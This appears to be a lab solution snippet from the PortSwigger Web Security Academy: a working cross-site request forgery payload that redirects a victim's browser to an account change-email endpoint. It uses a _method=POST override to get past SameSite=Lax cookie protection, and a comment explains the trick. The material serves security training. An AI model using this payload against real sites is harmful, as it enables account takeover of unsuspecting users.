
        <script>
            document.location = "https://0af300fd03488eec81944459003d00e7.web-security-academy.net/my-account/change-email?email=test@test.ew&_method=POST";
        </script>

/*
since GET is not allowed we crafted a URL which would cause a malicious GET request
BUT at the end we put the _method parameter to trick the server into thinking its a POST
BURP doesnt mention the SameSite cookie so LAX by default is beign used
*/